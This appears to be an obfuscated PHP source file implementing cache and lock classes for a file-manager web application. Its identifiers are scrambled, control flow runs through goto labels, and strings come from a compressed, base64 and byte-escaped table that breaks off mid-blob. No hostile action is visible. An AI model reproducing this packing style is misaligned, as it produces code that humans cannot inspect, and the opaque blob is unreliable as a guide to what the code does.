header($_SERVER[¿õñ][153] . $aÒØÕÚ ”’); die; } } goto dÒá×èÑĞ; AƒÏ÷§„à§: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aÛ™†”†á²; aÛ™†”†á²: $døŠ¼ÄÖË =& $_SERVER[¿õñ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto d±Ùß¼Ùî; d±Ùß¼Ùî: $eÏ ÜøÂ‚© = $GLOBALS[$døŠ¼ÄÖË[6]][$døŠ¼ÄÖË[334]]; $aÍ‰¸¢³† = $eÏ ÜøÂ‚©[$eÏ ÜøÂ‚©[$døŠ¼ÄÖË[760]]]; $D†¦ÀœÖÆÎ = $eÏ ÜøÂ‚©[$døŠ¼ÄÖË[761]]; goto c›—½š«‚; c›—½š«‚: switch ($eÏ ÜøÂ‚©[$døŠ¼ÄÖË[760]]) { case $døŠ¼ÄÖË[17]: self::$handle = Model($døŠ¼ÄÖË[762]); break; case $døŠ¼ÄÖË[763]: self::$handle = new CacheRedis($aÍ‰¸¢³†, $D†¦ÀœÖÆÎ); break; case $døŠ¼ÄÖË[764]: self::$handle = new CacheMemcached($aÍ‰¸¢³†, $D†¦ÀœÖÆÎ); break; case $døŠ¼ÄÖË[164]: self::$handle = new CacheFile($aÍ‰¸¢³†, $D†¦ÀœÖÆÎ); break; default: break; } return self::$handle; goto d§«°’“º; d§«°’“º: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($d‹„ñ…’‰¹) { if (is_array($d‹„ñ…’‰¹) || is_object($d‹„ñ…’‰¹)) { $d‹„ñ…’‰¹ = json_encode($d‹„ñ…’‰¹); } $d‹„ñ…’‰¹ = rawurlencode($d‹„ñ…’‰¹); return KOD_SITE_ID . $_SERVER[¿õñ][71] . $d‹„ñ…’‰¹; } public static function get($C‚ŒÉØ£à„) { $E¤Ÿ¦ÃŠô = self::key($C‚ŒÉØ£à„); if (!isset(self::$memoryCache[$E¤Ÿ¦ÃŠô])) { CacheLock::lock($C‚ŒÉØ£à„); $a­ï§Ÿï¬Ò = self::init()->get($E¤Ÿ¦ÃŠô); CacheLock::unlock($C‚ŒÉØ£à„); self::$memoryCache[$E¤Ÿ¦ÃŠô] = unserialize($a­ï§Ÿï¬Ò); } return self::$memoryCache[$E¤Ÿ¦ÃŠô]; } public static function set($C»ˆ‹µğ, $Fé¶ÓÆÇ¯ˆ, $aÜ‡ªæİÃ = false) { goto FÔÙïİ„‡; b–áêØİÌ©: CacheLock::lock($C»ˆ‹µğ); $dÅàÊ§¹£‚ = self::init()->set($eïâëí×´‹, serialize($Fé¶ÓÆÇ¯ˆ), $aÜ‡ªæİÃ); self::$memoryCache[$eïâëí×´‹] = $Fé¶ÓÆÇ¯ˆ; goto eÍâƒ¶Ê‚Å; eÍâƒ¶Ê‚Å: CacheLock::unlock($C»ˆ‹µğ); return $dÅàÊ§¹£‚; goto F•îÒƒ¥ç; FÔÙïİ„‡: $eïâëí×´‹ = self::key($C»ˆ‹µğ); if (isset(self::$memoryCache[$eïâëí×´‹]) && self::$memoryCache[$eïâëí×´‹] === $Fé¶ÓÆÇ¯ˆ) { return !0; } if ($aÜ‡ªæİÃ === 0) { self::$memoryCache[$eïâëí×´‹] = $Fé¶ÓÆÇ¯ˆ; return !0; } goto b–áêØİÌ©; F•îÒƒ¥ç: } public static function remove($böŞš‹¤”í) { goto dÈ¯ßˆŒÇì; Dä¦”Í–: return $cƒè„¯ËÄ; goto A­¶‡å¸·Ì; B¿‚Ù¯çÒ±: CacheLock::lock($böŞš‹¤”í); $cƒè„¯ËÄ = self::init()->remove($CÂ´î½Üˆò); CacheLock::unlock($böŞš‹¤”í); goto Dä¦”Í–; dÈ¯ßˆŒÇì: $CÂ´î½Üˆò = self::key($böŞš‹¤”í); unset(self::$memoryCache[$CÂ´î½Üˆò]); self::clearTimeout(); goto B¿‚Ù¯çÒ±; A­¶‡å¸·Ì: } public static function clearMemory($eÑõ¸îšõ = false) { if ($eÑõ¸îšõ) { $eÑõ¸îšõ = self::key($eÑõ¸îšõ); unset(self::$memoryCache[$eÑõ¸îšõ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¿õñ][765])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¿õñ][766])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($C§‡æÃô”‡, $F³ì¶‘„æº) { $EË ƒ©ø·Ğ =& $_SERVER[¿õñ]; $this->cachePath = $C§‡æÃô”‡[$EË ƒ©ø·Ğ[76]]; $this->prefix = $EË ƒ©ø·Ğ[767]; $this->cacheTime = $F³ì¶‘„æº; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($e«‘ß³´„„) { $F°‘¨¼Â =& $_SERVER[¿õñ]; $e«‘ß³´„„ = str_replace(array($F°‘¨¼Â[735], $F°‘¨¼Â[94], $F°‘¨¼Â[70]), $F°‘¨¼Â[768], $e«‘ß³´„„); return $this->cachePath . $F°‘¨¼Â[769] . $e«‘ß³´„„ . $F°‘¨¼Â[770]; } public function set($aÖÛ’××Ş², $e‰Ñ·ëßæ, $Eê Âºæ = false) { $føÃò¾ÑÚó = $this->getFile($aÖÛ’××Ş²); if (file_put_contents($føÃò¾ÑÚó, $this->prefix . $e‰Ñ·ëßæ, LOCK_EX)) { return !0; } @unlink($føÃò¾ÑÚó); return !1; } public function get($FŒÇÏöÁ¤²) { $b¿½Î¾­…Ÿ = $this->getFile($FŒÇÏöÁ¤²); if (file_exists($b¿½Î¾­…Ÿ) && filemtime($b¿½Î¾­…Ÿ) < time() - $this->cacheTime) { @unlink($b¿½Î¾­…Ÿ); return !1; } $DçÔ—Òèô‡ = @file_get_contents($b¿½Î¾­…Ÿ); return substr($DçÔ—Òèô‡, strlen($this->prefix)); } public function remove($CÛ‘éÛ‘“) { $eÉìÁÉˆÆ = $this->getFile($CÛ‘éÛ‘“); return @unlink($eÉìÁÉˆÆ); } public function deleteAll() { $dÖá­Š¢·÷ =& $_SERVER[¿õñ]; $f‡Ôà‚±´À = scandir($this->cachePath); foreach ($f‡Ôà‚±´À as $A©øãÚ›ã±) { $bØĞ‰®Òºô = $this->cachePath . $A©øãÚ›ã±; if (strpos($bØĞ‰®Òºô, $dÖá­Š¢·÷[770]) && strpos($bØĞ‰®Òºô, $dÖá­Š¢·÷[771])) { @unlink($bØĞ‰®Òºô); } } } public function clearTimeout() { $DªËóÃƒ =& $_SERVER[¿õñ]; $f‹Şç¦Ó‹— = scandir($this->cachePath); foreach ($f‹Şç¦Ó‹— as $f‚îˆÒ‘„) { $F¿®½šÙëÒ = $this->cachePath . $f‚îˆÒ‘„; if (strpos($F¿®½šÙëÒ, $DªËóÃƒ[770]) && strpos($F¿®½šÙëÒ, $DªËóÃƒ[771]) && filemtime($F¿®½šÙëÒ) < time() - $this->cacheTime) { @unlink($F¿®½šÙëÒ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÎÓ’¶«º; bÃÈ‚Š‡ª´: switch ($bŞ™î¸…Õ[$CÖÇÔÜ²¢‰[760]]) { case $CÖÇÔÜ²¢‰[763]: self::$handle = new CacheLockRedis(); break; case $CÖÇÔÜ²¢‰[764]: self::$handle = new CacheLockMemcached(); break; case $CÖÇÔÜ²¢‰[17]: self::$handle = new CacheLockDatabase(); break; case $CÖÇÔÜ²¢‰[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a›ïŒæœ; DÎÓ’¶«º: $CÖÇÔÜ²¢‰ =& $_SERVER[¿õñ]; if (self::$handle) { return self::$handle; } $bŞ™î¸…Õ = $GLOBALS[$CÖÇÔÜ²¢‰[6]][$CÖÇÔÜ²¢‰[334]]; goto e—´ÀÅ»Ó; e—´ÀÅ»Ó: self::$timeout = $bŞ™î¸…Õ[$CÖÇÔÜ²¢‰[772]] ? $bŞ™î¸…Õ[$CÖÇÔÜ²¢‰[772]] : 10; $FĞáÄÁ³½À = _get($GLOBALS[$CÖÇÔÜ²¢‰[6]], $CÖÇÔÜ²¢‰[773]); if ($bŞ™î¸…Õ[$CÖÇÔÜ²¢‰[760]] == $CÖÇÔÜ²¢‰[17] && $FĞáÄÁ³½À == $CÖÇÔÜ²¢‰[9]) { $bŞ™î¸…Õ[$CÖÇÔÜ²¢‰[760]] = $CÖÇÔÜ²¢‰[164]; } goto bÃÈ‚Š‡ª´; a›ïŒæœ: } private static function key($bó¹Ì¥®ğ£) { return $_SERVER[¿õñ][774] . Cache::key($bó¹Ì¥®ğ£); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($d»“¦Ò…Ú = '') { self::$errorMsg = $d»“¦Ò…Ú; } public static function lockGlobal($bÄÓ×–Ğğ†, $d¸³ÇŸ·à) { return self::lock($bÄÓ×–Ğğ†, $d¸³ÇŸ·à, !0); } public static function lock($eä‰äÖ“ˆ, $EÑ­ØÌç‰æ = false, $FÌ¥ğ«ˆà‹ = false) { goto fñŠ™¼å·; f¨ÕÉáéÖ: $EÑ­ØÌç‰æ = $EÑ­ØÌç‰æ ? $EÑ­ØÌç‰æ : self::$timeout; $a¹¼’ğ…… = $f÷í‰¦Û³¡->lock($dÆ¤šŒáÊß, $EÑ­ØÌç‰æ); if (!$a¹¼’ğ……) { $aª³Ñ¶Å¼¶ = $eÜŠ“¶íÒÑ[775] . $EÑ­ØÌç‰æ . $eÜŠ“¶íÒÑ[68] . self::$errorMsg . $eÜŠ“¶íÒÑ[68] . get_caller_msg(); $B²áî…É—ì = "\114\x6f\143\x6b\x20\141\x63\x74\151\x6f\x6e\x3a\x20{$dÆ¤šŒáÊß}\x20\x74\151\155\145\x6f\x75\164\x2c\x6f\166\x65\x72\x20{$EÑ­ØÌç‰æ}\40\163"; $B²áî…É—ì = self::$errorMsg ? self::$errorMsg : $b¹íãŸÒ„”; write_log($aª³Ñ¶Å¼¶, $eÜŠ“¶íÒÑ[776]); show_json($B²áî…É—ì, !1); } goto DÀÈ¯„÷›; fñŠ™¼å·: $eÜŠ“¶íÒÑ =& $_SERVER[¿õñ]; $f÷í‰¦Û³¡ = self::init(); $dÆ¤šŒáÊß = self::key($eä‰äÖ“ˆ); goto f¨ÕÉáéÖ; DÀÈ¯„÷›: if (!$FÌ¥ğ«ˆà‹) { self::$lockItem[$dÆ¤šŒáÊß] = !0; } return $a¹¼’ğ……; goto eá‡º¡É—; eá‡º¡É—: } public static function lockGet($dõ÷êÙ£ã) { $a”ä’‹­Ê = self::key($dõ÷êÙ£ã); if (self::$lockItem[$a”ä’‹­Ê]) { return self::$lockItem[$a”ä’‹­Ê]; } return self::init()->lockGet($a”ä’‹­Ê); } public static function unlock($e¶ùÎõ¶¯ó) { $DÜÎƒªöÂ = self::key($e¶ùÎõ¶¯ó); self::$lockItem[$DÜÎƒªöÂ] = null; return self::init()->unlock($DÜÎƒªöÂ); } public static function unlockRuntime() { $f©–ó¶… =& $_SERVER[¿õñ]; $EÏÆŞÇÅó  = self::init(); $DœğÎ¬˜Ş‹ = !1; foreach (self::$lockItem as $EíÀáŒÏ‰ğ => $b·ğÃì¹ä) { if (!$b·ğÃì¹ä) { continue; } $EÏÆŞÇÅó ->unlock($EíÀáŒÏ‰ğ); if (!$DœğÎ¬˜Ş‹) { $DœğÎ¬˜Ş‹ = !0; write_log($f©–ó¶…[777] . $EíÀáŒÏ‰ğ . $f©–ó¶…[68] . get_caller_msg(), $f©–ó¶…[776]); continue; } write_log($f©–ó¶…[777] . $EíÀáŒÏ‰ğ, $f©–ó¶…[776]); } } } goto d¢©¢ò…ÚÏ; CÖˆˆºä¢: if (!function_exists('_kodDe')) { function _kodDe($cÙéŒì«À) { $cÙéŒì«À = base64_decode($cÙéŒì«À); $Cò¡ƒ©ãÜš = strlen($cÙéŒì«À); $aÎ¡œì©ˆÄ = ''; $cµÊÍŞó Â = ord($cÙéŒì«À[0]) - 30; for ($A¤ï–ôÃÈ· = 1; $A¤ï–ôÃÈ· < $Cò¡ƒ©ãÜš; $A¤ï–ôÃÈ· += 2) { if ($A¤ï–ôÃÈ· + 1 < $Cò¡ƒ©ãÜš) { $aÎ¡œì©ˆÄ .= chr(ord($cÙéŒì«À[$A¤ï–ôÃÈ· + 1]) + $cµÊÍŞó Â); $aÎ¡œì©ˆÄ .= chr(ord($cÙéŒì«À[$A¤ï–ôÃÈ·]) + $cµÊÍŞó Â); } else { $aÎ¡œì©ˆÄ .= chr(ord($cÙéŒì«À[$A¤ï–ôÃÈ·]) + $cµÊÍŞó Â); } } return $aÎ¡œì©ˆÄ; } } define("\xbf\x8f\xf5\xf1", base64_decode('ppqb3g==')); $_SERVER[¿õñ] = explode("\174\4\174\2\174\1", gzinflate(substr(strrev('“Ò[=$ô“Ê9`œrHå²"Û%²#Çq^#Ã8y@¡hZhKBŒÙÅ[`='."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹').strrev('ï¾îï»îøİîï»îèëOè$÷}¿ô'."\n".'0–e(ÂV]”'."\n".'ÙFYïaÙiJ'."\n".'ehCa\'e’{ß').base64_decode('u78+ct8vT3/wX7+6//4N39uw04Yd33oF/4J/dwH/Q+E5J/xgB/TfzpmV/f6dGva4/YH7Inc/eA==')."\352\221\367\56\373\376\36\247\55\172\350\47\223\257\377\276\101\75\144\331\125\263\57\312\74\237\235\167\334\234\367\37\172\344\232\313\136\175\162\312\171\356\111\237\46\236\375\360\235\147\227\155\137\173\371"."\xf7\x36\xf\xae\xbe\x76\xe5\xc8\xbd\xbf\xee\xbd\x63\xdb\x8e\x27\xcf\x6e\xf8\x61\xfd\x92\xd1\xcc\xe9\xae\xdb\xde\x5d\xf7\xde\x8b\x77\x9d\xfe\xa3\x7\xef\xf8\xd7\xfa\xa3\xfa\x77\xbf\x60\xea\x7\x99\x43\xdb\x9b\xa6\x2f\x5b"."\xf4\xd9\xab\xff\x58\xf9\xdf\x8f\xea\xfc\x8f\x9e\x2d\x9f\x77\x5a\x71\xf3\x8e\xb7\xdd\x78\xd0\xc1\x77\x2c\xde\xb7\x27\x74\xd0\x5d\x3f\x3e\xed\x94\xdc\xf9\x11\xc7\xf7\x8e\x39\xf9\x85\x3\xf7\x3d\x64\xb7\xf9\xa9\x47\x5f\xd9".base64_decode('YaepO88a3uerd6S19/f9+vfPH31F1dQxqw/d9NnEGYu3zbvun+7THv3bUe3K20fZnzzn0VW7bQ==')."\275\122\216\265\307\225\275\57\372\252\352\244\123\47\316\170\361\332\255\113\316\233\173\370\300\202\364\331\267\125\115\135\74\362\316\327\227\177\62\232\323\116\273\340\77\312\23\13\135\317\377\254\245\316\325".base64_decode('9cdX2n5w0JHXvRxdt+HC5nMeX/LG0HXP688d9Eps6zk3rd/9tuKc/HjjJ7PPPMA8ZpdffrJ2lw==').base64_decode('my6+XJ6/+JqOTy86+9SLBuRlB1+w+d3LQ9vf3eOzOz64PvyB94udNynXvvT4TjvsgDu5Ff9IWQ==')._kodDe('LIa/lIaKXPj4prY0XtQ/jKKxt+5APlVHlrNFutMxcvsG/wBsAJP0G/o+Q1rBBGO7vI6sdxMG2c8=')."\0\237\22\213\213\344\264\234\222\265\100\70\40\56\233\162\124\66\110\111\356\256\210\333\63\350\363\257\211\204\326\14\172\10\106\64\62\221\127\364\51\34\103\301\240\51\353\146\110\315\50\14\143\122\147"."\xf5\xea\xf2\xf4\x7a\x7\xa4\x50\xc0\x35\x10\x74\x75\x87\xbc\xfe\x1\xc\xee\xf6\xf7\xf7\x7b\x43\xe5\xf0\x80\xdf\xe7\xeb\x72\x75\xaf\x28\x4f\x19\xc\xb8\x7a\xfb\x5d\x12\xa8\x5f\x5a\x89\xa8\xd9\x84\x56\x23\xad\xc3\x29\xeb"."\244\132\34\350\121\225\164\34\7\263\62\255\216\71\225\43\241\20\13\201\61\310\346\323\151\34\31\140\41\122\177\45\41\347\323\244\317\334\142\44\247\253\31\231\66\175\205\62\305\240\70\40\347\115\115"."\xcd\xc6\x70\xc4\x53\x34\x75\x99\xc3\x41\x8d\x63\xba\x92\x51\xb2\xa4\xa8\xa0\xc7\xe7\xe9\xe\x49\xb0\x9a\x52\x4f\xc0\xdf\x2f\x91\xa1\xc8\xc8\x86\xa9\xe8\xd2\x70\x9f\x27\xe0\x91\x60\xd5\xdb\xab\x51\x8b\xab\x25\x9c\x6f\x68"."\x0\x74\x88\xe4\xf2\xf9\xa4\x99\x4a\x30\x95\x4c\x8e\x16\x83\xf3\x54\x28\xcc\x1f\x70\x7b\x2\x52\xd7\x1a\x89\xf7\x53\x4c\xcb\x64\xb4\xac\x3\x94\x2\xc6\xd3\x14\xaa\xea\x9\x4\x70\xc0\x46\x28\xd8\xe7\x85\x43\x47\x22\xfe".base64_decode('np6gh8VI41b6QE2aCJVaYvFE2owU5HSeEus4/q0mP+RXMwgBT6hZNU+IlRShaQYleYPNIRJQaA==').base64_decode('IMuQQAEamV1gqhVwsL0D/y4jSNEITFN0M6JkY1pczZIJ2UkmHyFB2Uy5dRXgkQI1R0zLTfVrBQ==').base64_decode('0pqEmlZ8bL4ltHRc0Xk8B7KLKaRZ6rSQeyCfEVFYNJZS03GdTtNvwjQU0wT1N2gVh3JpTY4HFQ==')."\235\125\73\217\40\75\232\236\161\203\351\116\172\0\20\271\72\124\41\141\234\222\171\134\150\70\56\201\16\125\167\52\237\35\17\262\146\70\10\17\253\31\71\322\376\365\350\310\162\360\117\55\141\150\141"."\x52\xc5\x94\x92\x4e\x47\x94\xa2\x42\xe6\x4a\x26\xbe\xc8\xa0\xd5\x77\x1a\x51\x35\xeb\x4\x10\x1c\xf5\xfa\x23\x29\xd9\x48\xf5\xc7\x17\x45\x50\x2e\xca\x27\xe3\x4a\xd1\x91\x4b\xe5\xc8\x60\xb3\x19\x4c\x88\x18\xf6\xf4\x80\x66"."\x7a\x4\x36\x9b\xd6\x62\x32\x41\x4a\x99\x66\x2e\xa8\x64\xe3\x3d\xa0\x17\x49\xdb\xb4\xc9\x2c\xea\xa5\x9c\xa2\x90\x66\xb9\x6d\x52\x5c\xea\x97\xd6\x48\x7d\xad\x6a\x2b\x23\xb8\xb8\x9a\x98\xe2\x9c\x2e\x65\x66\x58\x91\xb4\xf7"."\71\314\140\100\263\110\50\240\212\304\225\242\111\172\104\132\26\113\311\72\30\263\366\274\231\260\57\41\14\43\227\113\253\61\331\124\265\254\123\213\231\212\151\67\114\135\221\111\151\125\313\44\70\376\160"."\346\326\341\134\164\326\164\153\131\23\114\133\173\110\227\263\106\102\321\355\36\102\314\255\22\350\124\306\271\50\232\133\65\162\232\241\302\317\264\112\262\151\312\261\24\234\365\274\370\366\157\300\127\263\151".base64_decode('NauU4bpiMcUw7DCLrqXtrnRam7T7dTWpgjx1JdUEHKlVouwyp+qKQaNSb3+IIINaKfZBXU5m5A==')."\x56\x29\x97\x8f\x82\x9e\x21\xb3\xb1\x2\xc\x63\x93\xaf\xb7\x4a\x31\x18\xb5\x49\x99\xbc\x61\xda\x75\x5\xb0\x1d\x15\x2c\x70\x64\xf0\xbc\x9\x7b\x3f\x1c\x4f\x55\x89\xdb\x83\x80\x3b\x13\x70\x53\x7d\xb3\x4\x48\x47\xa2\x69".base64_decode('GNoXCg1GvD1gER7wRPpdoe4+Um1TTtI6+wDPZUVS4Gq7P29CQhsAfcSBg9qkooMPd021SuNaPA==')."\252\25\35\64\11\42\303\311\104\221\141\217\346\114\173\100\316\46\141\377\104\247\114\305\240\153\110\140\225\47\20\11\372\173\102\303\256\0\131\237\263\240\247\213\264\54\230\67\155\17\50\161\320\267\61"."\x93\x96\x28\xe7\x60\xb7\x50\x1c\x38\x13\xe0\x20\xd2\x54\x38\x3b\x68\x9a\xcf\xdb\xb\x5b\xee\xb6\x1b\x0\xc9\x2e\x62\xd1\xb2\x7d\x6a\x46\x85\x95\x33\x59\xa\xea\x2a\xb0\x78\xf7\x92\xa\x39\x51\x8d\xdb\xc3\xa9\xba\x9a\x70"."\x7c\x61\xad\x1d\xfc\x5b\x57\x3b\x12\x76\x3b\xea\x46\x3b\x9d\x2a\xcf\xe3\x6c\x70\x34\x48\x8d\xf5\x2d\xd2\x20\x90\x26\x54\x39\x2d\x11\x32\x29\xc3\xa8\x97\xfc\x2b\xac\x84\xe4\x53\xb2\x49\x33\x45\x4\xac\x80\x67\xe5\x90\x27".base64_decode('GIr0e0J9fjfJ7XG5eetanU4eMVjMp+EpRxsygn9GyciApT+pxLS0pstpyEwoHSl0cifVBOfOXg==')."\40\240\220\217\140\366\305\43\101\65\223\243\214\307\114\345\63\121\41\350\344\45\20\46\2\106\212\261\33\215\255\44\232\116\102\254\366\363\33\173\50\307\164\6\233\300\377\71\173\214\153\31\231\112\226"."\150\102\52\161\74\43\61\250\316\222\322\247\310\174\151\62\165\123\203\120\335\202\322\257\230\51\215\114\214\244\102\253\224\147\165\243\265\214\53\151\205\366\122\112\241\353\5\20\227\12\254\363\162\272\222"."\x50\x9\xb9\x2\xf9\x8\xc0\x39\x77\x55\x8d\x0\xc8\x4\xe5\x15\x1a\x1f\x86\x62\x25\x7\x98\x9c\x11\xcb\x6\x67\xe6\x30\x22\xac\xaf\x3d\x43\x3e\x5f\xa4\xdb\x3f\x10\x2\xa2\x25\x86\xc\x7\xbc\x21\xf\x25\x16\x97\x3b\xe2".strrev('—h¶prËQÂVXÆ*™Î-)ö(k-9qà0âUV®”¬çã9ÏÀ£BÂÛ9]§'."\0".'‚&ëdê')."\63\323\366\214\142\312\166\126\165\353\272\45\205\304\5\333\113\206\200\63\301\64\130\40\301\176\201\56\222\203\376\40\311\320\11\241\100\246\210\52\72\251\307\340\20\111\312\10\303\337\353\41\300\131\164"."\315\223\33\10\255\14\7\51\3\313\3\174\135\235\226\171\33\73\151\175\110\331\305\114\232\213\111\21\325\62\176\21\55\72\6\230\27\40\72\271\122\253\355\174\254\102\175\336\201\25\221\176\277\333\343"."\213\170\7\0\167\14\225\303\207\6\335\56\72\370\42\274\313\37\352\263\100\207\0\13\131\345\362\171\113\321\75\253\275\301\120\260\142\22\200\15\171\112\122\300\26\152\60\340\351\361\256\146\321\36\257".base64_decode('x+cORrpd3X0cZ8DVTyKRBNzEGE4rfgQw+iDbCkUKcFtHOzNi2XdEqEQd4XQCFiWF0CZpLtxMog==')."\x96\x10\xc9\x36\xa6\xe5\x29\xb5\x32\x49\x2c\x43\x19\x44\x46\x26\x33\x54\x2e\x10\xb1\xb8\x6\xff\xd4\x4a\xae\xa0\x64\xe6\x22\x8c\x15\x44\xa7\x58\x10\x35\x83\xc6\x81\xe8\x45\xbe\x2f\x11\xbe\x5c\x56\x83\x8\xc4\xe9\x52\x12"."\232\256\174\23\300\225\60\31\141\224\304\301\274\341\151\140\4\134\150\327\12\50\1\215\110\204\316\105\3\110\371\56\132\235\4\337\61\106\374\140\153\355\202\373\315\310\160\300\77\320\113\62\114\246\24"."\132\1\57\351\376\32\52\244\220\155\247\311\131\22\220\60\144\56\54\322\116\37\323\150\127\156\300\77\13\360\17\20\312\310\307\225\54\355\365\50\144\314\214\161\320\235\4\230\55\224\251\152\171\366\265".base64_decode('qKal6TwGyzDjF2zDOmZQIilS5rSQrlpkcQj5V3gGIpSycEygRgwAW0B/gHSIqY3TbQhODHiClA==')."\xb\xe8\xca\x44\x5e\xa5\xdd\xe5\x74\x2c\x24\x54\xac\x80\xf5\x87\x7c\xde\xb9\x36\x3c\xb9\xb0\x66\xc4\xbe\xd0\x31\xa\x2\xb5\x75\xcb\x71\x94\xc4\xc2\xe\x4b\x74\x1e\xc9\x9f\xd7\x59\x6e\xb8\x64\xd7\x18\x9d\xb5\xad\x61\x67"."\330\131\323\331\72\342\262\117\313\366\351\172\373\122\373\350\302\260\243\166\41\1\214\256\157\264\65\157\204\10\0\261\163\356\50\370\151\17\167\316\17\333\27\34\266\156\371\110\170\264\272\165\341\301\141".strrev('í/b1Ï$•`áHÙo®‡Õ¦@€¢X‹%-H	T°¾5UŠlV-ƒ¯,Nı\'m]häğÜÇ')."\xf2\x9\xa0\xd2\x6f\x1\xa9\x6\xf0\xe7\x14\xc3\x73\xd9\xf\x85\x2d\x63\x59\xe1\xbc\x27\xf4\x91\xcf\xc6\x38\x77\x85\xf3\x22\x2a\xc7\x8\x1f\x50\x93\x59\x36\x85\xc0\x82\xce\xb6\xb6\x56\x69\x78\xfd\x7c\xfc\xbb\x91\xe\x64"."\x52\xa1\xcb\x32\x3c\x9f\xd2\x9\x75\xe6\xb3\xea\x4\xdd\xba\x67\x95\x9\x12\xd0\x4c\x4a\xdf\x51\xc5\x9c\x54\x28\x79\x0\xb8\x25\xe\x88\x83\x6e\xc1\x40\x92\x10\x4b\x23\xf9\x8d\x7c\x81\x6f\x83\x14\xb4\x27\x20\xad\xc8\x45".base64_decode('oNg1yWJxJUvGaTeCbcTknBIUWhiJhFxdPk+EchjCiWkcccUudtgFmsY5KttPckk5InZeTqZSAQ==')."\334\161\262\225\336\131\23\16\347\107\224\370\350\10\40\110\331\236\30\135\337\264\261\226\12\271\316\60\370\217\106\60\37\42\137\316\361\161\60\200\314\24\63\331\302\131\166\156\24\141\234\14\126\201\155"."\372\65\235\255\227\20\316\245\117\123\63\345\64\103\203\151\41\10\241\134\203\256\271\144\337\214\7\302\307\231\11\134\145\205\123\65\304\351\6\330\221\221\160\216\303\216\11\254\60\233\20\305\377\266\127".strrev(''."\r".'„h 	ÂUŠ'."\r".'aq°u”Á¹8aLzòĞÔ)5Á”zT¨:â%îÚµÅÆNÛ¯×Íİ´›ÎQ')."\x13\xd8\xe0\x32\x69\x3\x2\x9c\xd\x1e\xc4\xd8\xb8\x10\x6a\xe3\xbb\x7d\x1b\x13\x29\x6d\x44\xd2\xb4\xf1\xd2\x49\xd0\xeb\xb6\xa9\x86\x1b\x49\xbc\x36\x5a\x55\x33\x5\xb7\xcc\x69\x79\xca\x86\xab\xed\x53\xa\x4a\xda\x46\x2b"."\155\243\155\261\321\212\333\320\316\301\115\52\61\4\50\204\124\2\5\301\164\117\331\340\200\300\321\245\245\300\40\155\75\23\217\155\134\164\266\45\165\55\237\33\244\137\22\142\270\62\4\300\153\312\0".base64_decode('AU0zbXQrwwL9jJfA6vDQKj7OvPZsISRNwPHSOmAoTO+RC+K4VhzjrJUe+PklP13jgk/plqL0AA==')."\x87\x77\x22\xaf\x44\x48\x4e\x6\x85\xcf\x83\xd\x3e\xfd\x36\x6\x7\x94\xd8\x54\x8c\xef\x49\xdc\xc2\x26\xc7\x1a\x63\xe3\x8c\x68\xad\x12\xc1\x54\x1e\x67\x46\xd\xb3\x76\xdb\x8d\x12\x2d\xa7\x15\x42\x22\x16\x82\x9a\x91\x70".base64_decode('eav8Ob4+wGkfBDtIYWJTkJ/zkTxZz2QjRiWPSXpLoFCYUG3aaEu5MMonHW2ZBAuwCRwWjoCdDw==')."\243\20\45\77\252\26\301\335\31\311\260\175\0\353\337\22\76\3\273\173\120\315\116\251\131\161\247\315\241\234\263\361\201\207\44\314\143\270\217\147\12\143\266\301\167\362\66\262\303\267\201\135\336\270\300".base64_decode('0PiOFNQeZhXqTkoqqTmdZHZrlM+5IbCpidDaEGIltJmSdd7LdB5B4mWtMiAKjwpoCbnAmboljw==')."\100\375\206\71\305\16\45\204\240\265\120\34\165\317\24\351\143\173\265\112\121\161\332\251\206\17\364\146\245\60\152\151\110\253\30\105\153\270\4\126\157\172\226\105\205\361\110\311\241\0\210\12\43\25\261"."\234\37\340\152\270\30\173\3\142\110\32\214\200\356\200\223\244\27\62\57\161\201\341\213\17\144\230\70\54\40\345\112\371\234\205\37\127\132\323\112\71\162\11\264\44\312\77\152\141\67\145\53\20\21\101".strrev('¡0fˆâ=DäBj¸»HN¥FŸ*a”Æ¥£'."\0".'Ï ñeœ#üiAĞî²¢$l2Ò_Xäˆ')."\100\324\34\107\131\377\245\325\161\222\313\66\337\202\131\211\371\72\352\20\277\164\360\265\101\134\131\304\133\30\210\306\133\16\157\165\160\110\270\311\314\260\153\36\4\164\30\246\226\343\51\102\24\47\13"."\x49\xbc\x50\x1\x8b\x75\x3e\xaa\x21\xe0\xde\x71\xb4\x7e\xf3\x2e\x44\xb8\x24\x2f\x92\x55\x31\x61\x3a\xd2\x0\x83\x80\x1b\x44\x6e\xe2\xd2\x75\x3a\xce\xb8\x95\xf0\xc8\x4\x0\x45\x10\x9c\x71\x41\x7a\x64\x57\x89\xa9\xe2\x6f"."\170\12\374\242\22\27\5\277\357\300\153\214\103\216\307\375\364\74\113\14\227\243\212\333\367\312\5\241\273\143\126\224\20\253\214\16\66\356\374\152\252\64\76\143\26\74\335\304\114\42\144\306\154\75\110"."\x44\xa5\x57\x0\x95\x60\x4c\xf4\xea\x29\x21\x25\xbe\xe6\xf1\xeb\xbd\x52\x81\xd4\xca\x3f\xbe\x4d\x6a\x2a\x9b\x8\x7c\x40\x39\x4b\x4b\xa9\x59\xc5\x60\x8b\x89\x6e\x54\x62\xd\xdf\x26\x89\x58\x84\x51\xab\xec\x21\xa\x1d\x64"."\5\343\315\23\273\21\122\375\114\143\17\323\204\123\33\260\271\1\0\221\365\263\243\11\316\156\204\325\15\255\24\21\323\262\122\7\120\31\2\375\133\206\24\114\73\334\242\36\135\313\170\375\140\132\125"."\x26\xb2\x52\x3c\x85\x1e\xce\x20\x5e\x56\x64\x7b\x25\x31\x13\x20\xa\xb8\x70\xcc\x54\x26\x4d\x66\x45\xf1\x55\xe6\xaa\xe3\xff\x79\xc7\x65\x9f\x5d\xff\x4\x8e\xbd\x8f\x7f\x96\xb6\xb4\xe0\xc0\x86\x9d\xc1\xbf\xdf\xc3\x61\xae"."\x9d\x73\